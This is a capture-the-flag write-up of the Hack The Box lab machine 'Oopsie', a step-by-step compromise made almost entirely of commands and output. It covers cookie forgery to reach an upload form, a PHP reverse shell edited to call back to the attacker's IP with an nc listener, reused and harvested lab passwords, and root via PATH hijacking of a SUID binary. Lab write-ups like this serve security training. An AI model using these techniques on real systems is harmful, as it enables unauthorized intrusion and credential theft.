## ------>> Oopsie <<-------

// we will start with scanning using nmap

    $ nmap -sV -A -Pn -T4 10.10.10.28 -p-
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-31 09:23 UTC
    Stats: 0:01:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 13.03% done; ETC: 09:38 (0:12:21 remaining)
    Nmap scan report for 10.10.10.28
    Host is up (0.30s latency).
    Not shown: 65533 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
    |   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
    |_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Welcome
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 795.95 seconds
    
// quick directory search with FeroxBuster reveals me 'upload' directory, we will save that for later

    $ ./feroxbuster -u http://10.10.10.28/ -t 200

     ___  ___  __   __     __      __         __   ___
    |__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
    |    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
    by Ben "epi" Risher 🤓                 ver: 2.3.1
    ───────────────────────────┬──────────────────────
     🎯  Target Url            │ http://10.10.10.28/
     🚀  Threads               │ 200
     📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
     👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
     💥  Timeout (secs)        │ 7
     🦡  User-Agent            │ feroxbuster/2.3.1
     🔃  Recursion Depth       │ 4
    ───────────────────────────┴──────────────────────
     🏁  Press [ENTER] to use the Scan Cancel Menu™
    ──────────────────────────────────────────────────
    301        9l       28w      311c http://10.10.10.28/images
    301        9l       28w      307c http://10.10.10.28/js
    301        9l       28w      308c http://10.10.10.28/css
    301        9l       28w      311c http://10.10.10.28/themes
    301        9l       28w      312c http://10.10.10.28/uploads

// since its a web server we can use 'curl' command to gain more information

    $ curl http://10.10.10.28/
    <!DOCTYPE html>
    <html lang="en">
    <head>
    <meta charset="UTF-8">
    ...
    <div class="col-6">
    <p><i class="fa fa-phone" aria-hidden="true"></i> +44 (0)123 456 789</p>
    <p><i class="fa fa-envelope" aria-hidden="true"></i> admin@megacorp.com</p>
    </div>
    ...
    
// we found the admin mail - admin@megacorp.com

// Navigating to to http://10.10.10.28/ present me with some automobile site, searching in the page source reveals me some login directory

![Image 1](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_09_50_13.png)

// Since we have Administrative credentials that assosiate wit MegaCorp from last challenge(ArcheType) 

    # cat ConsoleHost_history.txt 
    net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
    
// Lets try input them in the login page
// And it Works !!!

![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_10_45_27.png)

// in the account directory(http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1) we see
Access ID | Name | Email
----------|------|-------
34322 | admin | admin@megacorp.com

// When navigating to uploads (http://10.10.10.28/cdn-cgi/login/admin.php?content=uploads) we get error due privilleges

![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_11_02_28.png)

// it seems we need super admin privilleges to upload files.  we know from account page that our id is 1 (http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=1) and Access ID is 34322 , since we know we need super admin id we can Brute Force the id section using BurpSuite intruder
 just get to account page and refresh using BurpSuite and then right click >> send to Intruder 
 , But , First lets make little wordlist from 1-100 for the id section using crunch
 
    $ crunch 3 3 1234567890 > wordlist1-100.txt
 ![Image 2](https://github.com/W0lfySec/HTB/blob/main/Images/Oopsie/Screenshot_2021-07-31_11_32_47.png)
 
 // We got super admin id - 865757
 , Now we can edit the request in BurpSuite , just refresh upload page with BurpSuite and change the values in the request

    Cookie: user=86575; role=superadmin

// It worked !, Now we can upload files!
// since we know(from the url) the server accepts php files lets try upload php reverse shell

    $ cp /usr/share/laudanum/php/php-reverse-shell.php rshell.php
// editing the file with our ip and port

    ...
    set_time_limit (0);
    $VERSION = "1.0";
    $ip = '10.10.16.7';  // CHANGE THIS
    $port = 1444;       // CHANGE THIS
    $chunk_size = 1400;
    $write_a = null;
    $error_a = null;
    $shell = 'uname -a; w; id; /bin/sh -i';
    $daemon = 0;
    $debug = 0;
    ...
// Dont forget to edit Access id and role in BurpSuite again when upload the file , and the upload successfull

    Repair Management System

    The file rshell.php has been uploaded.

// open a listener
    
    $ rlwrap nc -vnp 1444
    
// Navigate to http://10.10.10.28/uploads/rshell.php and we got a shell!

    $ rlwrap nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.7] from (UNKNOWN) [10.10.10.28] 57742
    Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
     12:17:46 up 23:24,  0 users,  load average: 0.27, 0.32, 0.27
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $

// getting a better shell

    $ SHELL=/bin/bash script -q /dev/null
    www-data@oopsie:/$ stty raw -echo
    www-data@oopsie:/$ fg
    www-data@oopsie:/$ reset
    www-data@oopsie:/$ xterm

// we got user flag !

    www-data@oopsie:/home/robert$ cat user.txt
    f2c74ee................

// digging in the /var/www directory i have found robert's credentials 

    www-data@oopsie:/var/www/html/cdn-cgi/login$ cat db.php
    <?php
    $conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
    ?>
// lets try to connect via ssh (Port 22) with those credentials

    $ ssh robert@10.10.10.28
    robert@10.10.10.28's password: M3g4C0rpUs3r!
    Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)

    robert@oopsie:~$ 

// We have connection !

## ----------Privilleges Escalation-----------

// Checking sudo permissions for robert didnt work, we can try to check robert's group

    robert@oopsie:~$ groups
    robert bugtracker

// can enumerate the filesystem to see if this group has any special access

    robert@oopsie:/etc$ find / -type f -group bugtracker 2>/dev/null
    /usr/bin/bugtracker
    
// we found a file 'bugtracker' with root permissions

    robert@oopsie:~$ ls -al /usr/bin/bugtracker 
    -rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
// running the program

    $ /usr/bin/bugtracker 
    ------------------
    : EV Bug Tracker :
    ------------------

    Provide Bug ID: 1
    ---------------
    Binary package hint: ev-engine-lib
    Version: 3.3.3-1
    Reproduce:
    When loading library in firmware it seems to be crashed
    What you expected to happen:
    Synchronized browsing to be enabled since it is enabled for that site.

    What happened instead:
    Synchronized browsing is disabled. Even choosing VIEW > SYNCHRONIZED BROWSING from menu does not stay enabled between connects.
// its seems like some bug reporting tool and its read from file we select.
since we know the owner of the file is root then he runs in root and doing some 'cat' function, lets try to "cat root.txt"

    robert@oopsie:~$ /usr/bin/bugtracker 

    ------------------
    : EV Bug Tracker :
    ------------------

    Provide Bug ID: ../root.txt
    ---------------

    af13b0b..................
    
// it worked !, now lets try to elevate to root, since we know bugtracker file that have root privilleges calling cat command with a relative PATH instead of an absolute one, that mean we can can make our own file named 'cat' that will executed instead the real one.
we just need to add the directory that we will make the 'cat' file to the PATH first(i use /tmp/)

    robert@oopsie:/tmp$ mkdir ...
    robert@oopsie:/tmp$ cd ...
    robert@oopsie:/tmp/...$ echo /bin/sh > cat
    robert@oopsie:/tmp/...$ chmod +x cat 
    robert@oopsie:/tmp/...$ export PATH=/tmp/...:$PATH
    robert@oopsie:/tmp/...$ /usr/bin/bugtracker 
    ------------------
    : EV Bug Tracker :
    ------------------

    Provide Bug ID: 1
    ---------------

    # whoami && id
    root
    uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)


// Post-Exploitation
// checking root directory i found /.config directory

    # ls -al
    total 48
    drwx------  8 root root 4096 Mar 20  2020 .
    drwxr-xr-x 24 root root 4096 Jan 27  2020 ..
    lrwxrwxrwx  1 root root    9 Jan 25  2020 .bash_history -> /dev/null
    -rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
    drwx------  2 root root 4096 Jan 24  2020 .cache
    drwxr-xr-x  3 root root 4096 Jan 25  2020 .config
    drwx------  3 root root 4096 Jan 24  2020 .gnupg
    drwxr-xr-x  3 root root 4096 Jan 23  2020 .local
    -rw-r--r--  1 root root  148 Aug 17  2015 .profile
    drwxr-xr-x  2 root root 4096 Jan 24  2020 reports
    -rw-r--r--  1 root root   33 Feb 25  2020 root.txt
    drwx------  2 root root 4096 Jan 23  2020 .ssh
    -rw-------  1 root root 1325 Mar 20  2020 .viminfo

    # cd /root/.config/filezilla
    # cat filezilla.xml

    <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
    <FileZilla3>
        <RecentServers>
            <Server>
                <Host>10.10.10.46</Host>
                <Port>21</Port>
                <Protocol>0</Protocol>
                <Type>0</Type>
                <User>ftpuser</User>
                <Pass>mc@F1l3ZilL4</Pass>
                <Logontype>1</Logontype>
                <TimezoneOffset>0</TimezoneOffset>
                <PasvMode>MODE_DEFAULT</PasvMode>
                <MaximumMultipleConnections>0</MaximumMultipleConnections>
                <EncodingType>Auto</EncodingType>
                <BypassProxy>0</BypassProxy>
            </Server>
        </RecentServers>
    </FileZilla3>

// we got ftp credentials - ftpuser : mc@F1l3ZilL4
